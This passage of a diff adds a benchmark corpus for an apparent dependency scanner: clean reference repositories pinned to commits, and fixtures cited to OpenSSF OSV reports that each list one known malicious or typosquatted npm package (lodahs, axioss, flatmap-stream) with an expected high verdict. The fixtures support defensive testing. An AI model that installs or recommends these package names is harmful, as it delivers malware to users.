+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "oven-sh/bun",
+        "ref": "8f1a9540fdff25410506de76e0da2506d260c08f"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "noisy-tauri-apps-tauri",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/tauri-apps/tauri",
+      "immutableRef": "f5347cd70838c027040acb4a66733a2470f20ae4",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "tauri-apps/tauri",
+        "ref": "f5347cd70838c027040acb4a66733a2470f20ae4"
+      },
+      "defaultBranchAtPin": "dev"
+    },
+    {
+      "sampleId": "noisy-puppeteer-puppeteer",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/puppeteer/puppeteer",
+      "immutableRef": "5f5f931a0f2bc64bfb30039c507d763ce044c263",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "puppeteer/puppeteer",
+        "ref": "5f5f931a0f2bc64bfb30039c507d763ce044c263"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "noisy-microsoft-typescript",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/microsoft/TypeScript",
+      "immutableRef": "637d5746b70257028fb95aad32ddec6b26ab0a14",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "microsoft/TypeScript",
+        "ref": "637d5746b70257028fb95aad32ddec6b26ab0a14"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "noisy-npm-cli",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/npm/cli",
+      "immutableRef": "7b1f6c173d17b3bf30e45426f6df39473c6a1163",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "npm/cli",
+        "ref": "7b1f6c173d17b3bf30e45426f6df39473c6a1163"
+      },
+      "defaultBranchAtPin": "latest"
+    },
+    {
+      "sampleId": "noisy-homebrew-brew",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/Homebrew/brew",
+      "immutableRef": "76ca8d74e4a180badad438bf245ddfc740d68a8e",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "Homebrew/brew",
+        "ref": "76ca8d74e4a180badad438bf245ddfc740d68a8e"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "noisy-python-cpython",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/python/cpython",
+      "immutableRef": "1fece4457032382947c7c2a5c9e95dc106ca7a7d",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "python/cpython",
+        "ref": "1fece4457032382947c7c2a5c9e95dc106ca7a7d"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "noisy-django-django",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/django/django",
+      "immutableRef": "bdbda29c3e126754c3ae04ceb5c5d35d49aae01c",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "django/django",
+        "ref": "bdbda29c3e126754c3ae04ceb5c5d35d49aae01c"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "noisy-ansible-ansible",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/ansible/ansible",
+      "immutableRef": "8d63341579aa1c62024f3bce1a8af3f9a1b22a16",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "ansible/ansible",
+        "ref": "8d63341579aa1c62024f3bce1a8af3f9a1b22a16"
+      },
+      "defaultBranchAtPin": "devel"
+    },
+    {
+      "sampleId": "noisy-scrapy-scrapy",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/scrapy/scrapy",
+      "immutableRef": "c9446931a80e63ea1d77e130ea5581b547e0f51b",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "scrapy/scrapy",
+        "ref": "c9446931a80e63ea1d77e130ea5581b547e0f51b"
+      },
+      "defaultBranchAtPin": "master"
+    },
+    {
+      "sampleId": "noisy-pallets-flask",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/pallets/flask",
+      "immutableRef": "36e4a824f340fdee7ed50937ba8e7f6bc7d17f81",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "pallets/flask",
+        "ref": "36e4a824f340fdee7ed50937ba8e7f6bc7d17f81"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "noisy-rust-lang-rust",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/rust-lang/rust",
+      "immutableRef": "5503df87342a73d0c29126a7e08dc9c1255c46ad",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "rust-lang/rust",
+        "ref": "5503df87342a73d0c29126a7e08dc9c1255c46ad"
+      },
+      "defaultBranchAtPin": "main"
+    },
+    {
+      "sampleId": "noisy-golang-go",
+      "corpus": "noisy-legitimate",
+      "label": "reference-clean",
+      "labelSource": "Expanded commit-pinned reference corpus",
+      "sourceUrl": "https://github.com/golang/go",
+      "immutableRef": "03845e30f7b73d1703bd8c21017297f6eecb76d6",
+      "maximumExpectedVerdict": "low",
+      "expectedDetectionCategories": [],
+      "target": {
+        "kind": "github",
+        "repo": "golang/go",
+        "ref": "03845e30f7b73d1703bd8c21017297f6eecb76d6"
+      },
+      "defaultBranchAtPin": "master"
+    },
+    {
+      "sampleId": "malicious-osv-mal-2024-8862",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2024-8862; report blob cebceb18d12edabb3bf055a6936a367b0614e792",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/bcrypts-js/MAL-2024-8862.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:cebceb18d12edabb3bf055a6936a367b0614e792",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2024-8862\",\"private\":true,\"dependencies\":{\"bcrypts-js\":\"2.4.4\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2024-1377",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2024-1377; report blob c78863fed3a5a3b662b72b05c16b77d9dc153665",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/cors-parser/MAL-2024-1377.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:c78863fed3a5a3b662b72b05c16b77d9dc153665",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2024-1377\",\"private\":true,\"dependencies\":{\"cors-parser\":\"*\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-19413",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-19413; report blob 84b9fce13d64dd7ec790910850e9fbbbf58cf348",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/electorn/MAL-2025-19413.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:84b9fce13d64dd7ec790910850e9fbbbf58cf348",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2025-19413\",\"private\":true,\"dependencies\":{\"electorn\":\"*\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-20690",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-20690; report blob 2fdd79a99598980c7c4cbaad70833538b602a95c",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/flatmap-stream/MAL-2025-20690.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:2fdd79a99598980c7c4cbaad70833538b602a95c",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2025-20690\",\"private\":true,\"dependencies\":{\"flatmap-stream\":\"*\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-25502",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-25502; report blob 67e0222164b6b5f6ec72ce58d7a20b430cac4dd2",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/lodahs/MAL-2025-25502.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:67e0222164b6b5f6ec72ce58d7a20b430cac4dd2",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2025-25502\",\"private\":true,\"dependencies\":{\"lodahs\":\"*\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-4275",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-4275; report blob 238dc228cd9cf54efea67c07f9bc7089b15207b4",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/axios.js/MAL-2025-4275.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:238dc228cd9cf54efea67c07f9bc7089b15207b4",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2025-4275\",\"private\":true,\"dependencies\":{\"axios.js\":\"*\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2026-4493",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2026-4493; report blob 366383ef9f8518dfc534b911251a2dbe5ccd3928",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/axiosqqq/MAL-2026-4493.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:366383ef9f8518dfc534b911251a2dbe5ccd3928",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2026-4493\",\"private\":true,\"dependencies\":{\"axiosqqq\":\"1.16.2\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-15242",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-15242; report blob 5850d1f4f2806fd59eb535b3e4d45beb058bc826",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/axioss/MAL-2025-15242.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:5850d1f4f2806fd59eb535b3e4d45beb058bc826",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2025-15242\",\"private\":true,\"dependencies\":{\"axioss\":\"*\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-15281",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-15281; report blob e6a3d9c6a3d214bff2f326a8f1d8ba8ac8c1d472",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-laoder/MAL-2025-15281.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:e6a3d9c6a3d214bff2f326a8f1d8ba8ac8c1d472",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2025-15281\",\"private\":true,\"dependencies\":{\"babel-laoder\":\"*\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-15282",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-15282; report blob b23f507de17d8c239290fb1c36a5d9a6d886b92c",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-loadre/MAL-2025-15282.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:b23f507de17d8c239290fb1c36a5d9a6d886b92c",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2025-15282\",\"private\":true,\"dependencies\":{\"babel-loadre\":\"*\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-15283",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-15283; report blob a98eafc3406e034fe14c4e2fe25edc21ee7e9a47",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-loqder/MAL-2025-15283.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:a98eafc3406e034fe14c4e2fe25edc21ee7e9a47",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2025-15283\",\"private\":true,\"dependencies\":{\"babel-loqder\":\"*\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-15286",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-15286; report blob 7d72739e67fda4b48cc77bfcb6c868feafd17567",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-node/MAL-2025-15286.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:7d72739e67fda4b48cc77bfcb6c868feafd17567",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2025-15286\",\"private\":true,\"dependencies\":{\"babel-node\":\"*\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-15289",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-15289; report blob 283dd8d75b91d4a35c89707bd10115e3d2ff9c69",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-pal/MAL-2025-15289.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:283dd8d75b91d4a35c89707bd10115e3d2ff9c69",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2025-15289\",\"private\":true,\"dependencies\":{\"babel-pal\":\"*\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-15238",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-15238; report blob aceadeea25bc4b32b766096204db12a15315e090",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/axios-http/MAL-2025-15238.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:aceadeea25bc4b32b766096204db12a15315e090",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2025-15238\",\"private\":true,\"dependencies\":{\"axios-http\":\"*\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2023-116",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2023-116; report blob 0d58b457e7175cc230bff6d7b6da40d3781a5466",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/axios-proxy/MAL-2023-116.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:0d58b457e7175cc230bff6d7b6da40d3781a5466",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2023-116\",\"private\":true,\"dependencies\":{\"axios-proxy\":\"*\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-4813",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-4813; report blob bcd00abcd6ee4bb4083f79b6e4d10b6d289aa392",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/axios-browserify/MAL-2025-4813.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:bcd00abcd6ee4bb4083f79b6e4d10b6d289aa392",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2025-4813\",\"private\":true,\"dependencies\":{\"axios-browserify\":\"1.0.0\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-190832",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-190832; report blob b9b988a111a6e0915333f4b29ce75fb1fe05f293",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/axios-builder/MAL-2025-190832.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:b9b988a111a6e0915333f4b29ce75fb1fe05f293",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2025-190832\",\"private\":true,\"dependencies\":{\"axios-builder\":\"1.2.1\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2024-10692",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2024-10692; report blob 79cb12c286a16d2f04288db57a43bce0b197d907",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/axios-mockadptr/MAL-2024-10692.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:79cb12c286a16d2f04288db57a43bce0b197d907",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2024-10692\",\"private\":true,\"dependencies\":{\"axios-mockadptr\":\"*\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-191389",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-191389; report blob 6bae4d1fc6ab36b3516d10c59910f905e50c4f3a",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/axios-cancelable/MAL-2025-191389.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:6bae4d1fc6ab36b3516d10c59910f905e50c4f3a",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2025-191389\",\"private\":true,\"dependencies\":{\"axios-cancelable\":\"1.0.1\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2026-2631",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2026-2631; report blob d20844f3c5e46ef0707cdad324c86ce0b027a8fa",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-plugin-blocks/MAL-2026-2631.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:d20844f3c5e46ef0707cdad324c86ce0b027a8fa",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2026-2631\",\"private\":true,\"dependencies\":{\"babel-plugin-blocks\":\"*\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-47613",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-47613; report blob 3075fa3df8d2b7a89c816127adda2b9188415350",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-ganache/MAL-2025-47613.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:3075fa3df8d2b7a89c816127adda2b9188415350",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2025-47613\",\"private\":true,\"dependencies\":{\"babel-ganache\":\"2.2.4\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2026-407",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2026-407; report blob 6bbba35a96333e1960acec15928b07c83544e48a",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-js/MAL-2026-407.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:6bbba35a96333e1960acec15928b07c83544e48a",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2026-407\",\"private\":true,\"dependencies\":{\"babel-js\":\"1.0.1\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-15287",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-15287; report blob 910018e9ea790fae8a6c9141550913cf26e5275d",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-npm-install/MAL-2025-15287.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:910018e9ea790fae8a6c9141550913cf26e5275d",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2025-15287\",\"private\":true,\"dependencies\":{\"babel-npm-install\":\"*\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-15288",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-15288; report blob 4a51f824f7203deffb5fd237dc4105ebfbfeba03",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-npm-publish/MAL-2025-15288.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:4a51f824f7203deffb5fd237dc4105ebfbfeba03",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2025-15288\",\"private\":true,\"dependencies\":{\"babel-npm-publish\":\"*\"}}\n"
+        }
+      }
+    },
+    {
+      "sampleId": "malicious-osv-mal-2025-3985",
+      "corpus": "real-malicious",
+      "label": "known-malicious-metadata",
+      "labelSource": "OpenSSF OSV MAL-2025-3985; report blob eb426f1379301192517dbb30aad8a7b4e6993343",
+      "sourceUrl": "https://github.com/ossf/malicious-packages/blob/1fcca18f1775b47bd272362330684aa2dd1ad870/osv/malicious/npm/babel-loader-fs/MAL-2025-3985.json",
+      "immutableRef": "osv:1fcca18f1775b47bd272362330684aa2dd1ad870:eb426f1379301192517dbb30aad8a7b4e6993343",
+      "expectedDetectionCategories": [
+        "SUSPICIOUS_DEPENDENCY"
+      ],
+      "minimumExpectedVerdict": "high",
+      "target": {
+        "kind": "fixture",
+        "files": {
+          "package.json": "{\"name\":\"flagrix-inert-mal-2025-3985\",\"private\":true,\"dependencies\":{\"babel-loader-fs\":\"*\"}}\n"
+        }
+      }
+    }
+  ],
+  "pinnedAt": "2026-07-13T11:45:32.366Z",
+  "sourceCorpusSha256": "e070f43e6cee4d783ec4fc5695b6f1aa6d920e434c8bfbb7c15ce67f809ffdc3"
+}
